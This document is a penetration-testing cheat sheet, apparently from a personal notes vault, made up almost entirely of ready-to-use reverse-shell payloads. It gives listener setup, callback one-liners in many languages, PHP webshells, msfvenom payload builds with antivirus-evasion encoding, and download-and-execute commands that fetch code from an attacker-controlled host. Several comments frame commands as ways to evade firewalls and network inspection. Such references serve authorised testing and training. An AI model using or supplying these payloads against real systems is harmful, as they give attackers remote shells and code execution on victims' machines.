# Reverse Shells — Ultimate Reference

**Tags:** #reverse-shell #payload #post-exploitation
**Usage:** Start listener first, then trigger shell on target

---

## Listener Setup

```bash
# Netcat (basic)
nc -lvnp 4444

# Rlwrap for arrow keys + history
rlwrap nc -lvnp 4444

# Ncat (TLS — evades network inspection)
ncat --ssl -lvp 4444

# Metasploit multi handler
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST $LHOST
set LPORT 4444
run -j
```

---

## Shell Upgrade (after getting basic shell)

```bash
# Method 1 — Python PTY
python3 -c 'import pty; pty.spawn("/bin/bash")'
# then: Ctrl+Z → stty raw -echo; fg → reset → export TERM=xterm

# Method 2 — script
script /dev/null -c bash

# Method 3 — socat (best)
# On Kali: socat file:`tty`,raw,echo=0 tcp-listen:4445
# On target: socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$LHOST:4445

# stty fix (after PTY upgrade)
stty rows 50 cols 200
export TERM=xterm-256color
```

---

## Bash

```bash
bash -i >& /dev/tcp/$LHOST/4444 0>&1
bash -c 'bash -i >& /dev/tcp/$LHOST/4444 0>&1'

# URL-encoded (for web exploits)
bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F$LHOST%2F4444%200%3E%261%27

# Via /dev/udp
bash -i >& /dev/udp/$LHOST/4444 0>&1

# Read/write file descriptor trick (firewall evasion)
exec 5<>/dev/tcp/$LHOST/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```

---

## Python

```bash
# Python3
python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect(("$LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python3 one-liner (cleaner)
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("$LHOST",4444));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/bash")'

# Python2
python2 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$LHOST",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'

# Windows Python
python -c "import socket,subprocess;s=socket.socket();s.connect(('$LHOST',4444));subprocess.call(['cmd.exe'],stdin=s,stdout=s,stderr=s)"
```

---

## PHP

```bash
# Webshell
<?php system($_GET['cmd']); ?>
<?php echo shell_exec($_GET['cmd']); ?>
<?php passthru($_GET['cmd']); ?>
<?php exec($_REQUEST['cmd'],$output); echo implode("\n",$output); ?>

# Full reverse shell
php -r '$sock=fsockopen("$LHOST",4444);exec("/bin/sh -i <&3 >&3 2>&3");'

# PHP reverse shell (one-liner)
php -r '$s=fsockopen("$LHOST",4444);$proc=proc_open("/bin/bash -i",array(0=>$s,1=>$s,2=>$s),$pipes);'

# PentestMonkey PHP shell (most reliable)
# https://github.com/pentestmonkey/php-reverse-shell
```

---

## PowerShell (Windows)

```powershell
# Basic
powershell -NoP -NonI -W Hidden -Exec Bypass -e BASE64ENCODED

# Encode command:
$cmd = 'IEX(New-Object Net.WebClient).downloadString("http://$LHOST/shell.ps1")'
[Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))

# Nishang — Invoke-PowerShellTcp
IEX(New-Object Net.WebClient).downloadString('http://$LHOST/Invoke-PowerShellTcp.ps1')
Invoke-PowerShellTcp -Reverse -IPAddress $LHOST -Port 4444

# Pure PowerShell reverse shell
$client = New-Object System.Net.Sockets.TCPClient("$LHOST",4444)
$stream = $client.GetStream()
[byte[]]$bytes = 0..65535|%{0}
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
  $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i)
  $sendback = (iex $data 2>&1 | Out-String)
  $sendback2 = $sendback + "PS " + (pwd).Path + "> "
  $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2)
  $stream.Write($sendbyte,0,$sendbyte.Length)
  $stream.Flush()}
$client.Close()

# ConPtyShell (fully interactive PTY — Windows)
IEX(IWR("http://$LHOST/Invoke-ConPtyShell.ps1", UseBasicParsing))
Invoke-ConPtyShell $LHOST 4444
```

---

## Netcat Variants

```bash
# Standard nc
nc -e /bin/bash $LHOST 4444
nc -e /bin/sh $LHOST 4444
nc -e cmd.exe $LHOST 4444  # Windows

# nc without -e (use mkfifo)
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc $LHOST 4444 >/tmp/f

# ncat
ncat $LHOST 4444 -e /bin/bash
ncat --ssl $LHOST 4444 -e /bin/bash  # Encrypted

# Busybox nc
busybox nc $LHOST 4444 -e /bin/sh
```

---

## Socat

```bash
# Simple
socat TCP:$LHOST:4444 EXEC:/bin/bash

# With PTY (fully interactive)
socat TCP:$LHOST:4444 EXEC:'bash -li',pty,stderr,setsid,sigint,sane

# Windows
socat TCP:$LHOST:4444 EXEC:cmd.exe,pipes

# Listener (on Kali) for PTY shell
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

---

## Perl

```bash
perl -e 'use Socket;$i="$LHOST";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}'
```

---

## Ruby

```bash
ruby -rsocket -e'f=TCPSocket.open("$LHOST",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

---

## Java

```bash
# In groovy (Jenkins)
String cmd = "bash -c {echo,BASE64CMD}|{base64,-d}|bash"
["bash", "-c", cmd].execute()

# Runtime.exec reverse shell
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/$LHOST/4444;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

---

## Node.js

```bash
node -e 'var n=require("net"),sp=require("child_process");var c=new n.Socket();c.connect(4444,"$LHOST",function(){var sh=sp.spawn("/bin/sh",[]);c.pipe(sh.stdin);sh.stdout.pipe(c);sh.stderr.pipe(c);});'
```

---

## Msfvenom Payloads

```bash
# Linux ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o rev.elf

# Linux Meterpreter (staged)
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f elf -o meter.elf

# Windows EXE
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o rev.exe

# Windows Meterpreter
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$LHOST LPORT=4444 -f exe -o meter.exe

# Windows DLL
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f dll -o evil.dll

# Windows MSI
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f msi -o evil.msi

# PHP webshell
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=4444 -f raw -o shell.php

# JSP (Java/Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f raw -o shell.jsp

# WAR (Tomcat)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f war -o shell.war

# ASPX (.NET)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f aspx -o shell.aspx

# HTA (HTML application)
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 -f hta-psh -o evil.hta

# PowerShell
msfvenom -p cmd/windows/reverse_powershell LHOST=$LHOST LPORT=4444 -f raw

# Encoded to evade AV
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=4444 \
  -e x64/xor_dynamic -i 10 -f exe -o obf_shell.exe
```

---

## Web-Delivered Shells (Stageless)

```bash
# Python HTTP server for delivery
python3 -m http.server 8080

# Download + execute (Linux)
curl http://$LHOST:8080/shell.sh | bash
wget -qO- http://$LHOST:8080/shell.sh | bash

# Download + execute (Windows)
powershell "IEX(New-Object Net.WebClient).downloadString('http://$LHOST:8080/shell.ps1')"
certutil.exe -urlcache -split -f http://$LHOST:8080/rev.exe C:\Temp\rev.exe && C:\Temp\rev.exe
bitsadmin /transfer job /download /priority high http://$LHOST:8080/rev.exe C:\Temp\rev.exe
```

---

## Related Notes

- [[07-Web-Application/File-Upload]] — Webshell delivery
- [[04-Exploitation/Linux/Linux]] — Linux exploitation
- [[04-Exploitation/Windows/Windows]] — Windows exploitation
